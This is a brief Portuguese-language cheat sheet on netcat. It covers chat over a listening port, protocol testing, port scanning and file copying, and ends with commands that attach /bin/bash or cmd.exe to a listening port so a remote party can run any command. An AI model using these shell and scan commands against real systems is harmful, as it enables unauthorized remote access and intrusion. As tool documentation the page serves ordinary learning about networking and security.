# Netcat (nc)

<https://nmap.org/ncat/>


### Executar o NC no modo listen em um Linux:
```
nc -l -p 1337
```

Executar em outro computador o NC para conexão:
```
nc 192.168.0.5 1337
```

Escreva em qualquer lado e obterá a informação na outra ponta.


### Pode-se simular / testar protocolos
```
nc -l -p 80 -vv
```
Abra o navegador e informe o IP do Servidor.

### Scan de Rede:
```
nc -v -n -z 192.168.10.15 10-1024
```

### Copiar arquivo:
```
nc -l -v -p 666 > test.txt
```
Do outro lado:
```
nc 192.168.0.5 666 < test.txt
```

### Executar um Shell reverso:
```
nc -l -p 8822 -e /bin/bash
nc -l -p 666 -e cmd.exe
```

Do outro lado:
```
nc 192.168.0.5 8822
nc 192.168.0.7 666
```
```
execute qualquer comando linux.
execute qualquer comando windows.
```